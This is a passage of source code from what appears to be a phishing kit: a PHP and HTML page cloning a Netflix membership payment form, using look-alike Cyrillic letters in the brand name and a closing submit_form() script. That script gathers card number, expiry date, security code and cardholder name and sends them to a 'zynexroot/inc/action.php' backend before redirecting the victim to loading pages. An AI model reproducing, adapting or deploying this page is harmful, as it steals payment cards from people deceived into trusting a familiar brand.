                                      <span id="" data-uia=""><?php echo $translations['iAgree']; ?></span>
                                    </label>
                      ...
                      <div class="submitBtnContainer">
                        <button class="pressable_styles__a6ynkg0 button_styles__1kwr4ym0  default-ltr-cache-1071m8g e1ax5wel2" data-uia="action-submit-payment" dir="ltr" id="submit_button" onclick="submit_form()" type="button" ><?php echo $translations['confirmMembership']; ?></button>
                      </div>
                      <div class="recaptcha-terms-of-use-container">
                        <span data-uia="recaptcha-terms-of-use">
                          <div class="default-ltr-cache-8dk3vg e10j8911">
                            <p class=" default-ltr-cache-1kz38kj euy28770"><?php echo $translations['recaptchaMessage']; ?> <button class="pressable_styles__a6ynkg0 anchor_styles__1h0vwqc0  default-ltr-cache-1m5ksse e1gz2xdw0" data-uia="recaptcha-learn-more-button" dir="ltr" role="link" type="button"><?php echo $translations['learnMore']; ?></button>
                            </p>
                          </div>
                          <div data-uia="recaptcha-disclosure" class="default-ltr-cache-km743h e10j8910">
                            <p class=" default-ltr-cache-1gzfkc9 euy28770">
                              <span>The information collected by Google reCAPTCHA is subject to the Google <a href="https://policies.google.com/privacy" id="recaptcha-privacy-link" data-uia="recaptcha-privacy-link" target="_blank">Privacy Policy</a> and <a href="https://policies.google.com/terms" id="recaptcha-tos-link" data-uia="recaptcha-tos-link" target="_blank">Terms of Service</a>, and is used for providing, maintaining, and improving the reCAPTCHA service and for general security purposes (it is not used for personalized advertising by Google). </span>
                            </p>
                          </div>
                        </span>
                      </div>
              ...
              <div class="site-footer-wrapper centered">
                ...
                <div class="site-footer">
                  <p class="footer-top">
                    <a class="footer-top-a" href="https://help.google.com/search?q=net&contactus"><?php echo $translations['questionsContactUs']; ?></a>
                  </p>
                  <ul class="footer-links structural">
                    <li class="footer-link-item" placeholder="footer_responsive_link_faq_item">
                      <a class="footer-link" data-uia="footer-link" href="https://help.google.com/search?q=net&support/412" target="_self" placeholder="footer_responsive_link_faq">
                        <span id="" data-uia="data-uia-footer-label"><?php echo $translations['faq']; ?></span>
                      </a>
                    </li>
                    <li class="footer-link-item" placeholder="footer_responsive_link_help_item">
                      <a class="footer-link" data-uia="footer-link" href="https://help.google.com/search?q=net&" target="_self" placeholder="footer_responsive_link_help">
                        <span id="" data-uia="data-uia-footer-label"><?php echo $translations['helpCenter']; ?></span>
                      </a>
                    </li>
                    <li class="footer-link-item" placeholder="footer_responsive_link_terms_item">
                      <a class="footer-link" data-uia="footer-link" href="https://help.google.com/search?q=net&legal/termsofuse" target="_self" placeholder="footer_responsive_link_terms">
                        <span id="" data-uia="data-uia-footer-label"><?php echo $translations['termsOfUse']; ?></span>
                      </a>
                    </li>
                    <li class="footer-link-item" placeholder="footer_responsive_link_privacy_separate_link_item">
                      <a class="footer-link" data-uia="footer-link" href="https://help.google.com/search?q=net&legal/privacy" target="_self" placeholder="footer_responsive_link_privacy_separate_link">
                        <span id="" data-uia="data-uia-footer-label"><?php echo $translations['privacy']; ?></span>
                      </a>
                    </li>
                    <li class="footer-link-item" placeholder="footer_responsive_link_cookies_separate_link_item">
                      <a class="footer-link" data-uia="footer-link" href="https://www.google.com/search?q=net&signup/creditoption#" target="_self" placeholder="footer_responsive_link_cookies_separate_link">
                        <span id="" data-uia="data-uia-footer-label"><?php echo $translations['cookiePreferences']; ?></span>
                      </a>
                    </li>
                    <li class="footer-link-item" placeholder="footer_responsive_link_corporate_information_item">
                      <a class="footer-link" data-uia="footer-link" href="https://help.google.com/search?q=net&legal/corpinfo" target="_self" placeholder="footer_responsive_link_corporate_information">
                        <span id="" data-uia="data-uia-footer-label"><?php echo $translations['corporateInformation']; ?></span>
                      </a>
                    </li>
                  </ul>
    ...
    <div id="onetrust-consent-sdk" data-nosnippet="true">
      ...
      <div id="onetrust-pc-sdk" class="otPcTab ot-hide ot-fade-in otRelFont" lang="en" aria-label="Preference center" role="region">
        <div role="dialog" aria-modal="true" style="height: 100%;" aria-label="Privacy Preference Center">
          ...
          <div class="ot-pc-header" role="presentation">
            ...
            <div class="ot-pc-logo" role="img" aria-label="Nеtflіх Logo">
              <img alt="Nеtflіх Logo" src="./process_files/Netflix_Logo_PMS.png">
            </div>
              ...
              <div class="ot-tab-desc ot-sdk-eight ot-sdk-columns">
                <div class="ot-desc-cntr" id="ot-tab-desc" tabindex="0" role="tabpanel" aria-labelledby="ot-pvcy-hdr">
                  ...
                  <p id="ot-pc-desc" class="ot-grp-desc">
                    ...
                    <br> For more information on our use of cookies, please visit the <a href="https://help.google.com/search?q=net&legal/privacy#cookies">Cookies and Internet Advertising</a> section of our <a href="https://help.google.com/search?q=net&legal/privacy">Privacy Statement.</a>
                    <br>
                    <br>
                  </p>
                </div>
                ...
                <div class="ot-desc-cntr ot-hide" role="tabpanel" tabindex="0" id="ot-desc-id-C0004">
                  ...
                  <p class="ot-grp-desc ot-category-desc">These cookies collect information via theNеtflіх service in connection with “Advertisements” (as defined in our <a href="https://help.google.com/search?q=net&legal/termsofuse">Terms of Use</a>). “Advertising Companies” (as defined in our <a href="https://help.google.com/search?q=net&legal/privacy">Privacy Statement</a>) may also collect information via these cookies in connection with Advertisements. If you opt out of advertising cookies, you may still see Advertisements on theNеtflіх service but they will not be based on information collected from advertising cookies. <br>
                    <br> “Nеtflіх Marketing Providers” (also defined in the our <a href="https://help.google.com/search?q=net&legal/privacy">Privacy Statement</a>) may also collect information via advertising cookies in connection withNеtflіх marketing campaigns promoting theNеtflіх service orNеtflіх content, such as our ads on third party services. If you opt out of advertising cookies, you may still seeNеtflіх marketing campaigns promoting theNеtflіх service orNеtflіх content, but they will not be based on information collected from these advertising cookies. <br>
          ...
          <div class="ot-pc-footer ot-pc-scrollbar">
            ...
            <div class="ot-pc-footer-logo">
              <a href="https://www.onetrust.com/products/cookie-consent/" target="_blank" rel="noopener noreferrer" aria-label="Powered by OneTrust Opens in a new Tab">
                <img alt="Powered by Onetrust" src="./process_files/powered_by_logo.svg" title="Powered by OneTrust Opens in a new Tab">
              </a>
            </div>
          </div>
        ...
        <iframe class="ot-text-resize" sandbox="allow-same-origin" title="onetrust-text-resize" style="position: absolute; top: -50000px; width: 100em;" aria-hidden="true" src="./process_files/saved_resource.html"></iframe>
      </div>
    </div>
    <div dir="ltr" lang="en-TN" data-uia="notification-manager-toast-group" class=" default-ltr-cache-1g8zp3r e53rikt0"></div>
    <div>
      <div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; position: fixed; visibility: hidden; display: block; transition: right 0.3s; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;">
        <div class="grecaptcha-logo">
          <iframe title="reCAPTCHA" width="256" height="60" role="presentation" name="a-4xyi8ku1qzgp" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="./process_files/anchor.html"></iframe>
        </div>
      ...
      <iframe style="display: none;" src="./process_files/saved_resource(1).html"></iframe>
    </div>
  </body>
  <f304d2aa1-62bc-4173-a64e-b81ba8e20080>
    <template shadowrootmode="closed">
      <div id="0a0c0772-28c8-47e0-90ba-bcd02cb8ce24" style="position: fixed; top: 0px; left: 50%; transform: translateX(-50%); z-index: 2147483647;"></div>
      <style>
        *,
        :after,
        :before {
...
async function submit_form() {
    ...
    // Define inputs with corresponding error message IDs
    const inputs = {
        cardnumber: { element: $('#cardnumber'), minLength: 19, borderId: '#bordercard', errorId: '#errorcard', validate: validateCardNumber },
        ExpiryDate: { element: $('#ExpiryDate'), minLength: 5, borderId: '#borderexp', errorId: '#errorexp', validate: validateExpiryDate },
        SecurityCode: { element: $('#SecurityCode'), minLength: 3, borderId: '#bordercvv', errorId: '#errorcvv' },
        NameOnCard: { element: $('#NameOnCard'), minLength: 2, borderId: '#bordername', errorId: '#errorfullname' }
    };

    let isValid = true;
    Object.entries(inputs).forEach(([key, { element, minLength, borderId, errorId, validate }]) => {
        const value = element.val()?.trim();
        const isValidField = validate ? validate(value) : value.length >= minLength;
        if (!value || !isValidField) {
            $(borderId).css('border', '1px solid red');
            $(errorId).show(); // Show the corresponding error message
            isValid = false;
        } else {
            $(borderId).css('border', '');
            $(errorId).hide(); // Hide the error message if field is valid
        }
    });
    ...
    if (!isValid) {
        $('#dom-login-button').prop('disabled', false);
        return; // Stop form submission if invalid
    }

    // Disable button to prevent multiple submissions
    $('#dom-login-button').prop('disabled', true);

    try {
        // Prepare data to be sent
        const formData = Object.fromEntries(
            Object.entries(inputs).map(([key, {element}]) => [key, element.val().trim()])
        );

        const response = await fetch('zynexroot/inc/action.php?type=process', {
            method: 'POST',
        ...
        if (parsed_response.status === 'ok') {
            var redirectUrl = <?php echo (file_get_contents("zynexroot/offline.txt") == 1) ? "'process.php'" : "'loading.php'"; ?>;
            window.location.href = redirectUrl;
        } else {
            console.error('Error:', parsed_response.message);
            $('#dom-login-button').prop('disabled', false); // Re-enable the button on error
        }
    } catch (error) {
        console.error('Fetch error:', error);
        $('#dom-login-button').prop('disabled', false); // Re-enable the button on fetch error
    }
}


function validateCardNumber(value) {
    var cardNumber = value.replace(/\s/g, ''); // Remove spaces for validation
    ...
    // Check for valid lengths (Amex is typically 15, Visa/Mastercard are 16)
...
function validateExpiryDate(value) {
    return /^\d{2}\/\d{2}$/.test(value); // Validates format MM/YY
}

$('input').on('input change', function () {
    // Format card number and expiry date dynamically
    if ($(this).attr('id') === 'cardnumber') {
        this.value = this.value.replace(/[^\dA-Z]/g, '').replace(/(.{4})/g, '$1 ').trim().slice(0, 19);
    } else if ($(this).attr('id') === 'ExpiryDate') {
        this.value = this.value.replace(/\D/g, '').replace(/(\d{2})(\d{2})/, '$1/$2').slice(0, 5);
    }

    // Validate field
    const borderId = $(this).data('border-id');
    const errorId = $(this).data('error-id');
    const isValid = this.data('validate') ? window[this.data('validate')](this.value) : this.value.trim().length >= $(this).data('min-length');
    if (isValid) {
        $(borderId).css('border', ''); // Clear the border if input is valid
        $(errorId).hide(); // Also hide the error message
    } else {
        $(borderId).css('border', '1px solid red');
